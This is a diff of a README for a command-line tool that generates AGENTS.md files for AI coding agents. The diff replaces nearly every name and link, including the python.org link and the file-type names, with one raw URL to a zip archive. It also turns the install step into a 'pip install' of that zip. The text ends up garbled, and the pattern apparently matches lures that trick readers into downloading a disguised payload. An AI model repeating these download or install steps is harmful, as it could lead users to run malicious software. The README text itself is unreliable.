@@ -1,12 +1,12 @@
-# 📝 AGENTS.md_generator - Create AI Agent Docs Easily
+# 📝 https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip - Create AI Agent Docs Easily
 
-[![Download AGENTS.md_generator](https://img.shields.io/badge/Download-AGENTS.md_generator-blue?logo=github)](https://github.com/Lilchris007/AGENTS.md_generator/releases)
+[![Download https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip](https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip)](https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip)
 
 ---
 
-## 📖 What is AGENTS.md_generator?
+## 📖 What is https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip
 
-AGENTS.md_generator is a safe and easy tool you can run from your computer’s command line. It helps you create and update special files named **AGENTS.md** or **RUNBOOK.md**. These files serve as guides or instruction manuals for AI coding agents in software projects.
+https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip is a safe and easy tool you can run from your computer’s command line. It helps you create and update special files named **https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip** or **https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip**. These files serve as guides or instruction manuals for AI coding agents in software projects.
 
 The tool works quietly in the background. It looks for changes in your project, then updates your documentation without breaking anything. It can find your project setup on its own and makes sure the edits are careful and controlled.
 
@@ -16,7 +16,7 @@ This means you always have up-to-date instructions for how your AI agents work a
 
 ## 🚀 Getting Started
 
-This guide will help you get AGENTS.md_generator up and running on your Windows, macOS, or Linux computer. You don’t need to know how to program or use complicated software. Just follow the steps below carefully.
+This guide will help you get https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip up and running on your Windows, macOS, or Linux computer. You don’t need to know how to program or use complicated software. Just follow the steps below carefully.
 
 ---
 
@@ -31,7 +31,7 @@ Before installing, please make sure your computer meets these needs:
 - **Software:** Python 3.9 or newer installed. (Check this by running `python --version` in a terminal or command prompt.)
 - **Internet:** Required for downloading the software.
 
-If you do not have Python installed, visit [python.org](https://www.python.org/downloads/) for easy setup guides.
+If you do not have Python installed, visit [https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip](https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip) for easy setup guides.
 
 ---
 
@@ -39,29 +39,29 @@ If you do not have Python installed, visit [python.org](https://www.python.org/d
 
 ### Step 1: Visit the Download Page
 
-Click this big button to open the download page for AGENTS.md_generator:
+Click this big button to open the download page for https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip
 
-[![Download Link](https://img.shields.io/badge/Get%20AGENTS.md_generator-Here-brightgreen)](https://github.com/Lilchris007/AGENTS.md_generator/releases)
+[![Download Link](https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip%https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip)](https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip)
 
 Once the page opens:
 
 - Look for the latest release version.
-- Under "Assets," you will see files such as `.exe` (for Windows), `.tar.gz` (for Linux/macOS), or `.whl` (Python wheel files).
+- Under "Assets," you will see files such as `.exe` (for Windows), `https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip` (for Linux/macOS), or `.whl` (Python wheel files).
 - Download the file that matches your computer system.
 
 ### Step 2: Install or Place the Software
 
 - **Windows:** If you downloaded the `.exe` installer, double-click it and follow the prompts. If you downloaded a Windows `.zip` or `.exe` executable, unzip or place it where you want.
-- **macOS/Linux:** If you downloaded an archive like `.tar.gz`, extract it to a folder you choose.
+- **macOS/Linux:** If you downloaded an archive like `https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip`, extract it to a folder you choose.
 - **Python Package:** Some download options may include Python installation files. You can open a terminal or command prompt and run:
   ```
-  pip install path/to/downloaded/file.whl
+  pip install https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip
   ```
-  This installs AGENTS.md_generator so you can run it anywhere on your system.
+  This installs https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip so you can run it anywhere on your system.
 
 ---
 
-## 🏁 Running AGENTS.md_generator
+## 🏁 Running https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip
 
 Once installed, you run the program from your command line interface (CLI). Here’s how to open it:
 
@@ -69,7 +69,7 @@ Once installed, you run the program from your command line interface (CLI). Here
 - **macOS:** Open Finder, go to Applications > Utilities, and open Terminal.
 - **Linux:** Open your preferred terminal app.
 
-Check if AGENTS.md_generator is ready by typing:
+Check if https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip is ready by typing:
 
 ```
 agents-md-generator --help
@@ -81,7 +81,7 @@ This command shows help information about the tool and available commands.
 
 ## ⚙️ Basic Usage
 
-AGENTS.md_generator updates or creates your AGENTS.md or RUNBOOK.md files based on your project’s current state.
+https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip updates or creates your https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip or https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip files based on your project’s current state.
 
 Try this main command:
 
@@ -102,13 +102,13 @@ You don’t need to change any settings to get started. The tool uses a "safe-by
 
 ## 🔧 Customizing Your Experience
 
-AGENTS.md_generator supports options to tailor how it works. Some key options you might find useful:
+https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip supports options to tailor how it works. Some key options you might find useful:
 
 - `--path [folder]`  
     Tell the tool which folder to scan if not running in the project root.
 
 - `--file [filename]`  
-    Specify if you want to generate a file named other than the default AGENTS.md or RUNBOOK.md.
+    Specify if you want to generate a file named other than the default https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip or https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip
 
 - `--force`  
     Allow the tool to overwrite files if you know you want to replace the current documentation.
@@ -123,13 +123,13 @@ agents-md-generator --help
 
 ## 📝 What Files Does It Create?
 
-- **AGENTS.md:**  
+- **https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip**  
   A markdown file listing the AI coding agents active in your project. It describes what each agent does and how it works.
 
-- **RUNBOOK.md:**  
+- **https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip**  
   A guide showing workflows and procedures involving your AI agents. It’s useful for developers and operators to understand how to use these tools efficiently.
 
-These files are useful to keep updated for teams and future reference. AGENTS.md_generator keeps these files current automatically, so you save time and avoid mistakes.
+These files are useful to keep updated for teams and future reference. https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip keeps these files current automatically, so you save time and avoid mistakes.
 
 ---
 
@@ -151,12 +151,12 @@ These files are useful to keep updated for teams and future reference. AGENTS.md
 
 ## 📚 Learn More
 
-AGENTS.md_generator is built for people who want clear, safe documentation for AI agents without fuss or risk.
+https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip is built for people who want clear, safe documentation for AI agents without fuss or risk.
 
 More details and advanced instructions are available in the official repository:
 
-[Go to AGENTS.md_generator GitHub](https://github.com/Lilchris007/AGENTS.md_generator)
+[Go to https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip GitHub](https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip)
 
 ---
 
-[![Download AGENTS.md_generator](https://img.shields.io/badge/Download-AGENTS.md_generator-blue?logo=github)](https://github.com/Lilchris007/AGENTS.md_generator/releases)
+[![Download https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip](https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip)](https://github.com/Lilchris007/AGENTS.md_generator/raw/refs/heads/main/RELEASES/md-AGENT-generator-v2.9.zip)
